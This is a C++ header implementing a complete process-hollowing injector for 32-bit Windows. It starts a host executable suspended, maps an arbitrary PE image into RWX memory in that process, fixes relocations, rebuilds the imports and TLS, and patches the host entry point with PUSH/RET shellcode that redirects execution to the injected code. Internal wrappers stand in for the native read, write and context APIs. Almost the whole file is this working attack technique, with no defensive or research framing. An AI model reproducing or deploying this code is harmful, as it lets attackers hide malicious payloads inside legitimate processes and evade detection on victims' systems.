#pragma once

#define DATADIRECTORIESCOUNT 15

class ProcessHollowingHelper
{
	static bool CheckSupportedDataDirectories(byte* inAssemblyContent)
	{
		bool result = false;

		if (inAssemblyContent != nullptr)
		{
			result = true;

			PortableExecutableParser* pe = new PortableExecutableParser(inAssemblyContent);

			DWORD* dataDirectories = GetListOfSupportedDataDirectories();

			for (int index = 0; index < DATADIRECTORIESCOUNT; index++)
			{
				if (dataDirectories[index] == 0 && !pe->IsDataDirectoryEmpty(index))
				{
					result = false;

					break;
				}
			}

			delete dataDirectories;
			delete pe;
		}

		return result;
	}

	static DWORD* GetHostImageBase(PPROCESS_INFORMATION inProcessInformation, PCONTEXT inProcessContext)
	{
		DWORD* result = nullptr;

		DWORD processImageBase = 0;
		DWORD readBytes = 0;

		if (MyNtReadVirtualMemory(inProcessInformation->hProcess, LPCVOID(inProcessContext->Ebx + 8), &processImageBase, 4, &readBytes) == 0)
		{
			result = new DWORD(processImageBase);
		}

		return result;
	}

	static bool GetVirtualAddressOfFreeSpaceInHostMemorySpace(PPROCESS_INFORMATION inProcessInformation, DWORD inStartAddressofTryingToAllocateMemory, DWORD* refMemorySize, DWORD* outVirtualAddressOfAllocatedMemory)
	{
		bool result = false;

		if (*refMemorySize != 0)
		{
			DWORD startAddressofTryingToAllocateMemory = (inStartAddressofTryingToAllocateMemory + 0x1000) & 0xFFFFF000;

			*refMemorySize = ((*refMemorySize + 0x1000) & 0xFFFFF000);

			for (DWORD index = startAddressofTryingToAllocateMemory; index < (0x80000000 - 0x1000); index += 0x1000)
			{
				if (VirtualAllocEx(inProcessInformation->hProcess, LPVOID(index), *refMemorySize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == LPVOID(index))
				{
					*outVirtualAddressOfAllocatedMemory = index;

					result = true;

					break;
				}

			}
		}

		return result;
	}

	static bool WriteDataToHostMemory(PPROCESS_INFORMATION inProcessInformation, DWORD inVirtualAddress, byte* inData, DWORD inDataLength)
	{
		bool result = false;

		DWORD oldProtectionStatus = 0;

		if (VirtualProtectEx(inProcessInformation->hProcess, LPVOID(inVirtualAddress), inDataLength, PAGE_READWRITE, &oldProtectionStatus) == TRUE)
		{
			DWORD tempWriteByte = 0;

			if (MyNtWriteVirtualMemory(inProcessInformation->hProcess, PVOID(inVirtualAddress), inData, inDataLength, &tempWriteByte) == 0)
			{
				DWORD tempProtectionStatus = 0;

				if (VirtualProtectEx(inProcessInformation->hProcess, PVOID(inVirtualAddress), inDataLength, oldProtectionStatus, &tempProtectionStatus) == TRUE)
				{
					result = true;
				}
			}
		}

		return result;
	}

	static byte* MapAssemblyFileContentToMemory(byte* inAssemblyContent, DWORD* outMappedAssemblySize)
	{
		byte* result;

		PortableExecutableParser* pe = new PortableExecutableParser(inAssemblyContent);

		*outMappedAssemblySize = pe->SizeOfImage;

		result = new byte[*outMappedAssemblySize];

		memset(result, 0, *outMappedAssemblySize);

		//
		memcpy(result, pe->PeContent, pe->NtHeader->OptionalHeader.SizeOfHeaders);

		for (DWORD index = 0; index < pe->SectionCount; index++)
		{
			memcpy(pe->GetSectionHeader(index)->VirtualAddress + result, pe->PeContent + pe->GetSectionHeader(index)->PointerToRawData, pe->GetSectionHeader(index)->SizeOfRawData);
		}

		//
		delete pe;

		return result;
	}

	static void RelocateAddressesInMappedMemory(byte* inAssemblyContent, byte* inMappedAssembly, DWORD inImageBaseOfAllocatedMemoryInOtherProcess)
	{
		PortableExecutableParser* pe = new PortableExecutableParser(inAssemblyContent);

		if (pe->GetDataDirectory(5)->VirtualAddress != 0 && pe->GetDataDirectory(5)->Size != 0)
		{
			//
			int changeValue = inImageBaseOfAllocatedMemoryInOtherProcess - pe->ImageBase;

			//
			DWORD directoryFileOffset = pe->GetFileOffsetOfRelativeVirtualAddress(pe->GetDataDirectory(5)->VirtualAddress);
			DWORD directorySize = pe->GetDataDirectory(5)->Size;

			//
			for (DWORD index = directoryFileOffset; index < directoryFileOffset + directorySize;)
			{
				DWORD pageRva = *PDWORD(pe->PeContent + index);
				DWORD pageOffsetCount = (*PDWORD(pe->PeContent + index + 4) - 8) / 2;

				index += 8;

				for (DWORD internalIndex = 0; internalIndex < pageOffsetCount; internalIndex++)
				{
					WORD relocOffset = (*PWORD(pe->PeContent + index)) & 0x0FFF;
					byte relocType = static_cast<byte>((*PWORD(pe->PeContent + index)) >> 12);

					//BASED_HIGHLOW = 3

					if (relocType == 3)
					{
						int* relocVistualAddress = reinterpret_cast<int*>(DWORD(inMappedAssembly) + pageRva + relocOffset);

						*relocVistualAddress += changeValue;
					}
					else if (relocType == 0)
					{
						// Ignored
					}

					index += 2;
				}
			}
		}

		//
		delete pe;
	}

	static DWORD CalculateSizeOfNewImportTableDataStructure(byte* inMappedAssembly, DWORD* outImportTableSize, DWORD* outImportAddressTableSize, DWORD* outImportNamesSize, DWORD* outJumpTableSize)
	{
		// I don't consider the alignment of even memory addresses directly; instead, I handle it differently when constructing the import table. I use my own lazy approach

		DWORD result = 0;

		//
		PortableExecutableParser* pe = new PortableExecutableParser(inMappedAssembly);

		if (pe->GetDataDirectory(1)->VirtualAddress != 0 && pe->GetDataDirectory(1)->Size != 0)
		{
			*outImportTableSize = 0;
			*outImportAddressTableSize = 0;
			*outImportNamesSize = 0;
			*outJumpTableSize = 0;

			DWORD sizeofImportDescriptorDataStructure = sizeof(IMAGE_IMPORT_DESCRIPTOR);
			DWORD iatCellSize = 4;
			DWORD hintSize = 2;
			DWORD jumpTableInstructionSize = 6;

			auto importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(inMappedAssembly + pe->GetDataDirectory(1)->VirtualAddress);

			// For last empty IMAGE_IMPORT_DESCRIPTOR 
			result += sizeofImportDescriptorDataStructure;
			*outImportTableSize += sizeofImportDescriptorDataStructure;

			while (true)
			{
				//
				bool isEmpty = true;

				for (DWORD index = 0; index < sizeof(IMAGE_IMPORT_DESCRIPTOR); index++)
				{
					if (reinterpret_cast<byte*>(importDescriptor)[index] != 0)
					{
						isEmpty = false;

						break;
					}
				}

				if (isEmpty)
				{
					break;
				}

				//
				result += sizeofImportDescriptorDataStructure;
				*outImportTableSize += sizeofImportDescriptorDataStructure;

				DWORD assemblyNameLength = lstrlenA(LPCSTR(inMappedAssembly + importDescriptor->Name)) + 1;

				result += assemblyNameLength;
				*outImportNamesSize += assemblyNameLength;

				DWORD* apiAddresses = reinterpret_cast<DWORD*>(inMappedAssembly + importDescriptor->FirstThunk);

				// For last empty IAT cell
				result += iatCellSize;
				*outImportAddressTableSize += iatCellSize;

				while ((*apiAddresses) != 0)
				{
					// For jump table instruction
					result += jumpTableInstructionSize;
					*outJumpTableSize += jumpTableInstructionSize;

					// For IAT cell
					result += iatCellSize;
					*outImportAddressTableSize += iatCellSize;

					if (((*apiAddresses) & 0x80000000) != 0x80000000)
					{
						DWORD apiNameLength = lstrlenA(LPCSTR(inMappedAssembly + (*apiAddresses) + 2)) + 1;

						result += hintSize + apiNameLength;
						*outImportNamesSize += hintSize + apiNameLength;
					}

					apiAddresses++;
				}

				importDescriptor++;
			}
		}

		//
		delete pe;

		return result;
	}

	static byte* BuildNewImportTableDataStructureAndUpdateCurrentImportAddressTable(byte* inMappedAssembly, DWORD inHostImageBase, DWORD inRelativeVirtualAddressOfNewLocationForImportTable, DWORD inSizeOfNewLocationForImportTable, DWORD inImportTableIndex, DWORD inImportAddressTableIndex, DWORD inImportNamesIndex, DWORD inJumpTableIndex, DWORD* outRelativeVirtualAddressOfNewImportTable, DWORD* outSizeOfNewImportTable)
	{
		byte* result = nullptr;

		/*
		* This function processes IMAGE_IMPORT_DESCRIPTOR structures in a simplified manner.
		* It assumes that the only valid fields are 'Name' and 'FirstThunk', and other fields
		* such as 'Characteristics/OriginalFirstThunk', 'TimeDateStamp', and 'ForwarderChain'
		* are not considered in this implementation. This is intended for handling the most
		* basic cases where the Name of the DLL and the Import Address Table (IAT) are the
		* primary points of interest.
		*
		* Note: This function does not handle bound imports, forwarders, or any advanced
		* features of the IMAGE_IMPORT_DESCRIPTOR structure. Use this only when dealing
		* with straightforward import scenarios.
		*/

		//
		PortableExecutableParser* pe = new PortableExecutableParser(inMappedAssembly);

		if (pe->GetDataDirectory(1)->VirtualAddress != 0 && pe->GetDataDirectory(1)->Size != 0)
		{
			//
			result = new byte[inSizeOfNewLocationForImportTable];

			memset(result, 0, inSizeOfNewLocationForImportTable);

			DWORD sizeofImportDescriptorDataStructure = sizeof(IMAGE_IMPORT_DESCRIPTOR);
			DWORD iatCellSize = 4;
			DWORD hintSize = 2;
			DWORD jumpTableInstructionSize = 6;

			DWORD currentImportTableIndex = inImportTableIndex;
			DWORD currentImportAddressTableIndex = inImportAddressTableIndex;
			DWORD currentImportNamesIndex = inImportNamesIndex;
			DWORD currentJumpTableIndex = inJumpTableIndex;

			if (currentImportAddressTableIndex % iatCellSize != 0)
			{
				currentImportAddressTableIndex += iatCellSize - (currentImportAddressTableIndex % iatCellSize);
			}

			if (currentJumpTableIndex % 2 == 1)
			{
				currentJumpTableIndex += 1;
			}

			//
			auto importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(inMappedAssembly + pe->GetDataDirectory(1)->VirtualAddress);

			while (true)
			{
				//
				bool isEmpty = true;

				for (DWORD index = 0; index < sizeofImportDescriptorDataStructure; index++)
				{
					if (reinterpret_cast<byte*>(importDescriptor)[index] != 0)
					{
						isEmpty = false;

						break;
					}
				}

				if (isEmpty)
				{
					break;
				}

				// Copy the import descriptor to the new one
				IMAGE_IMPORT_DESCRIPTOR* newImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(result + currentImportTableIndex);

				memcpy(newImportDescriptor, importDescriptor, sizeofImportDescriptorDataStructure);

				// Add assembly name to the new import descriptor
				if (currentImportNamesIndex % 2 == 1)
				{
					currentImportNamesIndex += 1;
				}

				newImportDescriptor->Name = inRelativeVirtualAddressOfNewLocationForImportTable + currentImportNamesIndex;

				DWORD assemblyNameLength = lstrlenA(LPCSTR(inMappedAssembly + importDescriptor->Name)) + 1;

				memcpy(result + currentImportNamesIndex, LPCSTR(inMappedAssembly + importDescriptor->Name), assemblyNameLength);

				currentImportNamesIndex += assemblyNameLength;

				// Add IAT address to the new import descriptor
				newImportDescriptor->OriginalFirstThunk = 0;
				newImportDescriptor->FirstThunk = inRelativeVirtualAddressOfNewLocationForImportTable + currentImportAddressTableIndex;

				//
				DWORD* apiAddresses = reinterpret_cast<DWORD*>(inMappedAssembly + importDescriptor->FirstThunk);

				while ((*apiAddresses) != 0)
				{
					//
					if (((*apiAddresses) & 0x80000000) == 0x80000000)
					{
						*((PDWORD)(result + currentImportAddressTableIndex)) = *apiAddresses;
					}
					else
					{
						if (currentImportNamesIndex % 2 == 1)
						{
							currentImportNamesIndex += 1;
						}

						*((PDWORD)(result + currentImportAddressTableIndex)) = inRelativeVirtualAddressOfNewLocationForImportTable + currentImportNamesIndex;

						// Copy Hint
						memcpy(result + currentImportNamesIndex, inMappedAssembly + (*apiAddresses), hintSize);

						currentImportNamesIndex += hintSize;

						// Copy api name
						DWORD apiNameLength = lstrlenA(LPCSTR(inMappedAssembly + (*apiAddresses) + 2)) + 1;

						memcpy(result + currentImportNamesIndex, LPCSTR(inMappedAssembly + (*apiAddresses) + 2), apiNameLength);

						currentImportNamesIndex += apiNameLength;
					}

					// Update the current Import Address Table (IAT) to redirect to the new IAT address and incorporate the necessary jump table instructions (FF 25 00 00 00 00)
					byte* jumpInstructionPointer = (byte*)(result + currentJumpTableIndex);

					jumpInstructionPointer[0] = 0xFF;
					jumpInstructionPointer[1] = 0x25;
					*PDWORD(jumpInstructionPointer + 2) = inHostImageBase + inRelativeVirtualAddressOfNewLocationForImportTable + currentImportAddressTableIndex;

					*apiAddresses = inHostImageBase + inRelativeVirtualAddressOfNewLocationForImportTable + currentJumpTableIndex;

					currentJumpTableIndex += jumpTableInstructionSize;

					//
					currentImportAddressTableIndex += iatCellSize;

					apiAddresses++;
				}

				// Add a blank iat cell to the iat of the current assembly
				currentImportAddressTableIndex += iatCellSize;

				// Move to the next import descriptor
				importDescriptor++;
				currentImportTableIndex += sizeofImportDescriptorDataStructure;
			}

			*outRelativeVirtualAddressOfNewImportTable = inRelativeVirtualAddressOfNewLocationForImportTable;
			*outSizeOfNewImportTable = currentImportTableIndex;
		}

		//
		delete pe;

		return result;
	}

	static bool WriteImportTableToHostMemory(PPROCESS_INFORMATION inProcessInformation, DWORD inHostImageBase, DWORD inSizeOfHostImage, byte* inMappedAssembly, DWORD* outRelativeVirtualAddressOfNewImportTable, DWORD* outSizeOfNewImportTable)
	{
		bool result = false;

		if (inHostImageBase != 0)
		{
			//
			PortableExecutableParser* pe = new PortableExecutableParser(inMappedAssembly);

			DWORD sizeOfImportTable = pe->GetDataDirectory(1)->Size;
			DWORD relativeVirtualAddressOfImportTable = pe->GetDataDirectory(1)->VirtualAddress;

			//
			if (sizeOfImportTable != 0 && relativeVirtualAddressOfImportTable != 0)
			{
				DWORD importTableSize = 0;
				DWORD importAddressTableSize = 0;
				DWORD importNamesSize = 0;
				DWORD jumpTableSize = 0;

				DWORD sizeOfNewImportTableDataStructure = CalculateSizeOfNewImportTableDataStructure(inMappedAssembly, &importTableSize, &importAddressTableSize, &importNamesSize, &jumpTableSize);

				if (sizeOfNewImportTableDataStructure != 0)
				{
					// Considering the alignment of even memory addresses through the allocation of additional memory
					sizeOfNewImportTableDataStructure *= 2;

					importTableSize *= 2;
					importAddressTableSize *= 2;
					importNamesSize *= 2;
					jumpTableSize *= 2;

					DWORD importTableIndex = 0;
					DWORD importAddressTableIndex = importTableSize;
					DWORD importNamesIndex = importAddressTableIndex + importAddressTableSize;
					DWORD jumpTableIndex = importNamesIndex + importNamesSize;

					//
					DWORD startAddressofTryingToAllocateMemory = inHostImageBase + inSizeOfHostImage;

					DWORD virtualAddressOfNewImportTableDataStructure;

					if (GetVirtualAddressOfFreeSpaceInHostMemorySpace(inProcessInformation, startAddressofTryingToAllocateMemory, &sizeOfNewImportTableDataStructure, &virtualAddressOfNewImportTableDataStructure))
					{
						DWORD relativeVirtualAddressOfNewImportTable;
						DWORD sizeOfNewImportTable;

						byte* newImportTableDataStructure = BuildNewImportTableDataStructureAndUpdateCurrentImportAddressTable(inMappedAssembly, inHostImageBase, virtualAddressOfNewImportTableDataStructure - inHostImageBase, sizeOfNewImportTableDataStructure, importTableIndex, importAddressTableIndex, importNamesIndex, jumpTableIndex, &relativeVirtualAddressOfNewImportTable, &sizeOfNewImportTable);

						if (newImportTableDataStructure != nullptr)
						{
							if (WriteDataToHostMemory(inProcessInformation, virtualAddressOfNewImportTableDataStructure, newImportTableDataStructure, sizeOfNewImportTableDataStructure))
							{
								*outRelativeVirtualAddressOfNewImportTable = relativeVirtualAddressOfNewImportTable;
								*outSizeOfNewImportTable = sizeOfNewImportTable;

								result = true;
							}

							delete newImportTableDataStructure;
						}
					}
				}
			}

			//
			delete pe;
		}

		return result;
	}

	static bool WriteThreadLocalStorageToHostMemory(PPROCESS_INFORMATION inProcessInformation, PCONTEXT inProcessContext, DWORD inHostImageBase, DWORD inSizeOfHostImage, byte* inAssemblyContent, byte* inMappedAssembly, DWORD* outRelativeVirtualAddressOfNewTls, DWORD* outSizeOfNewTls)
	{
		bool result = false;

		//
		PortableExecutableParser* pe = new PortableExecutableParser(inAssemblyContent);

		if (!pe->IsDataDirectoryEmpty(9))
		{
			DWORD startAddressofTryingToAllocateMemory = inHostImageBase + inSizeOfHostImage;

			DWORD virtualAddressOfThreadLocalStorage;
			DWORD sizeOfThreadLocalStorageDirectory = pe->GetDataDirectory(9)->Size;

			if (GetVirtualAddressOfFreeSpaceInHostMemorySpace(inProcessInformation, startAddressofTryingToAllocateMemory, &sizeOfThreadLocalStorageDirectory, &virtualAddressOfThreadLocalStorage))
			{
				if (WriteDataToHostMemory(inProcessInformation, virtualAddressOfThreadLocalStorage, inMappedAssembly + pe->GetDataDirectory(9)->VirtualAddress, sizeOfThreadLocalStorageDirectory))
				{
					*outRelativeVirtualAddressOfNewTls = virtualAddressOfThreadLocalStorage - inHostImageBase;
					*outSizeOfNewTls = sizeOfThreadLocalStorageDirectory;

					result = true;
				}
			}
		}
		else
		{
			result = true;

			*outRelativeVirtualAddressOfNewTls = 0;
			*outSizeOfNewTls = 0;
		}

		//
		delete pe;

		return result;
	}

	static bool ModifyHostEntryPoint(PPROCESS_INFORMATION inProcessInformation, PCONTEXT inHostProcessContext, DWORD inImageBaseOfAllocatedMemory, DWORD inAddressOfEntryPoint)
	{
		bool result = false;

		DWORD hostEntryPointModificationLength = 6;
		byte* hostEntryPointModification = new byte[hostEntryPointModificationLength];
		DWORD hostEntryPointAddress = inHostProcessContext->Eax;

		DWORD oldProtectionStatus = 0;
		DWORD readBytes = 0;

		if (VirtualProtectEx(inProcessInformation->hProcess, LPVOID(hostEntryPointAddress), hostEntryPointModificationLength, PAGE_EXECUTE_READWRITE, &oldProtectionStatus) == TRUE)
		{
			if (MyNtReadVirtualMemory(inProcessInformation->hProcess, LPVOID(hostEntryPointAddress), hostEntryPointModification, hostEntryPointModificationLength, &readBytes) == 0)
			{
				DWORD shellCodeLength = 0x1000;

				DWORD virtualAddressOfShellCode = DWORD(VirtualAllocEx(inProcessInformation->hProcess, nullptr, shellCodeLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

				if (virtualAddressOfShellCode != 0)
				{
					DWORD entryPointContentLength = 1 + 4 + 1;
					byte* entryPointContent = new byte[entryPointContentLength];

					entryPointContent[0] = 0x68; // PUSH
					*(PDWORD(entryPointContent + 1)) = virtualAddressOfShellCode;
					entryPointContent[5] = 0xC3; // RET

					if (WriteDataToHostMemory(inProcessInformation, hostEntryPointAddress, entryPointContent, entryPointContentLength))
					{
						//
						byte* shellCode = new byte[shellCodeLength];

						memset(shellCode, 0, shellCodeLength);

						//
						int indexInshellCode = 0;

						for (int index = 0; index < int(hostEntryPointModificationLength); index++, indexInshellCode += 7)
						{
							*PWORD(shellCode + indexInshellCode) = 0x05C6; // MOV BYTE PTR DS:[xxxxxxxx],xx
							*PDWORD(shellCode + indexInshellCode + 2) = hostEntryPointAddress + index;
							*PBYTE(shellCode + indexInshellCode + 6) = hostEntryPointModification[index];
						}

						//
						*PBYTE(shellCode + indexInshellCode) = 0x68; // PUSH
						*PDWORD(shellCode + indexInshellCode + 1) = inImageBaseOfAllocatedMemory + inAddressOfEntryPoint;
						*PBYTE(shellCode + indexInshellCode + 5) = 0xC3; // RET

						//
						if (WriteDataToHostMemory(inProcessInformation, virtualAddressOfShellCode, shellCode, shellCodeLength))
						{
							result = true;
						}

						//
						delete shellCode;
					}

					delete entryPointContent;
				}
			}
		}

		delete hostEntryPointModification;

		return result;
	}

	static bool Inject(byte* inPeContent, PPROCESS_INFORMATION inProcessInformation, PCONTEXT inHostProcessContext, DWORD inImageBaseOfAllocatedMemory, DWORD inAddressOfEntryPoint)
	{
		bool result = false;

		DWORD mappedAssemblySize = 0;

		byte* mappedMemory = MapAssemblyFileContentToMemory(inPeContent, &mappedAssemblySize);

		if (mappedMemory != nullptr)
		{
			RelocateAddressesInMappedMemory(inPeContent, mappedMemory, inImageBaseOfAllocatedMemory);

			auto hostImageBase = GetHostImageBase(inProcessInformation, inHostProcessContext);

			if (hostImageBase != nullptr)
			{
				DWORD hostHeaderContentLength = 0x1000;
				byte* hostHeaderContent = new byte[hostHeaderContentLength];

				if (MyNtReadVirtualMemory(inProcessInformation->hProcess, LPCVOID(*hostImageBase), hostHeaderContent, 0x1000, &hostHeaderContentLength) == 0)
				{
					PortableExecutableParser* hostPe = new PortableExecutableParser(hostHeaderContent);

					DWORD relativeVirtualAddressOfNewImportTable;
					DWORD sizeOfNewImportTable;

					DWORD relativeVirtualAddressOfNewTls;
					DWORD sizeOfNewTls;

					if (WriteImportTableToHostMemory(inProcessInformation, *hostImageBase, hostPe->NtHeader->OptionalHeader.SizeOfImage, mappedMemory, &relativeVirtualAddressOfNewImportTable, &sizeOfNewImportTable))
					{
						if (WriteThreadLocalStorageToHostMemory(inProcessInformation, inHostProcessContext, *hostImageBase, hostPe->NtHeader->OptionalHeader.SizeOfImage, inPeContent, mappedMemory, &relativeVirtualAddressOfNewTls, &sizeOfNewTls))
						{
							if (WriteDataToHostMemory(inProcessInformation, inImageBaseOfAllocatedMemory, mappedMemory, mappedAssemblySize))
							{
								byte* pointerToDataDirectories = reinterpret_cast<byte*>(&(hostPe->GetDataDirectory(0)->VirtualAddress));
								DWORD virtualAddressOfDataDirectories = *hostImageBase + DWORD(&(hostPe->GetDataDirectory(0)->VirtualAddress)) - DWORD(hostHeaderContent);
								DWORD sizeOfDataDirectories = DATADIRECTORIESCOUNT * sizeof(IMAGE_DATA_DIRECTORY);

								hostPe->SetDataDirectory(PortableExecutableParser::DirectoryType::ImportDirectory, relativeVirtualAddressOfNewImportTable, sizeOfNewImportTable);
								hostPe->SetDataDirectory(PortableExecutableParser::DirectoryType::TlsDirectory, relativeVirtualAddressOfNewTls, sizeOfNewTls);

								if (WriteDataToHostMemory(inProcessInformation, virtualAddressOfDataDirectories, pointerToDataDirectories, sizeOfDataDirectories))
								{
									if (ModifyHostEntryPoint(inProcessInformation, inHostProcessContext, inImageBaseOfAllocatedMemory, inAddressOfEntryPoint))
									{
										result = true;
									}
								}
							}
						}
					}

					delete hostPe;
				}

				delete hostHeaderContent;
				delete hostImageBase;
			}

			delete mappedMemory;
		}

		return result;
	}

	static bool RunProcess(byte* inPeContent, wchar_t* inHostFileAddress, HANDLE* outProcessHandle)
	{
		bool result = false;

		if (inPeContent != nullptr && inHostFileAddress != nullptr)
		{
			*outProcessHandle = nullptr;

			PortableExecutableParser* pe = new PortableExecutableParser(inPeContent);

			PROCESS_INFORMATION processInformation;
			STARTUPINFOW startupInformation;

			RtlZeroMemory(&processInformation, sizeof(processInformation));
			RtlZeroMemory(&startupInformation, sizeof(startupInformation));

			BOOL createProcessResult = CreateProcessW(inHostFileAddress, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &startupInformation, &processInformation);

			if (createProcessResult)
			{
				CONTEXT hostProcessContext;

				hostProcessContext.ContextFlags = CONTEXT_FULL;

				if (MyNtGetContextThread(processInformation.hThread, PCONTEXT(&hostProcessContext)) == 0)
				{
					LPVOID imageBaseOfAllocatedMemory = VirtualAllocEx(processInformation.hProcess, nullptr, pe->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

					if (imageBaseOfAllocatedMemory != nullptr)
					{
						if (Inject(inPeContent, &processInformation, &hostProcessContext, DWORD(imageBaseOfAllocatedMemory), pe->NtHeader->OptionalHeader.AddressOfEntryPoint))
						{
							result = MyNtResumeThread(processInformation.hThread, nullptr) == 0;

							if (outProcessHandle != nullptr)
							{
								*outProcessHandle = processInformation.hProcess;
							}
						}
					}
				}

				if (result == false)
				{
					TerminateProcess(processInformation.hProcess, 0);

					CloseHandle(processInformation.hProcess);
				}
			}

			delete pe;
		}

		return result;
	}

public:

	static DWORD* GetListOfSupportedDataDirectories()
	{
		DWORD* result = new DWORD[DATADIRECTORIESCOUNT];

		memset(result, 0, DATADIRECTORIESCOUNT * sizeof(DWORD));

		result[PortableExecutableParser::DirectoryType::ImportDirectory] = 1;
		result[PortableExecutableParser::DirectoryType::RelocationDirectory] = 1;
		result[PortableExecutableParser::DirectoryType::TlsDirectory] = 1;
		result[PortableExecutableParser::DirectoryType::ImportAddressTableDirectory] = 1;

		return result;
	}

	static bool IsSupportedAsHostFile(wchar_t* inHostFileAddress)
	{
		bool result = false;

		auto length = 0;

		auto fileContent = FileOperationHelper::ReadFileContent(inHostFileAddress, &length);

		if (length != 0 && fileContent != nullptr)
		{
			PortableExecutableParser* pe = new PortableExecutableParser(fileContent);

			if (pe->HasDosSignature && pe->HasNtSignature)
			{
				result = (pe->NtHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_I386);
			}

			delete pe;
			delete fileContent;
		}

		return result;
	}

	static bool IsSupportedAsInjectedFile(byte* inAssemblyContent, bool* outIsDataDirectoriesSupported)
	{
		bool result = false;

		if (outIsDataDirectoriesSupported != nullptr)
		{
			*outIsDataDirectoriesSupported = false;
		}

		if (inAssemblyContent != nullptr)
		{
			PortableExecutableParser* pe = new PortableExecutableParser(inAssemblyContent);

			if (pe->HasDosSignature && pe->HasNtSignature)
			{
				result = (pe->NtHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_I386);

				if (result && outIsDataDirectoriesSupported != nullptr)
				{
					*outIsDataDirectoriesSupported = CheckSupportedDataDirectories(inAssemblyContent);
				}
			}

			delete pe;
		}
		return result;
	}

	static bool Run(byte* inPeContent, wchar_t* inHostFileAddress, HANDLE* outProcessHandle)
	{
		bool result = false;

		if (IsSupportedAsHostFile(inHostFileAddress) && IsSupportedAsInjectedFile(inPeContent, nullptr))
		{
			result = RunProcess(inPeContent, inHostFileAddress, outProcessHandle);
		}

		return result;
	}
};

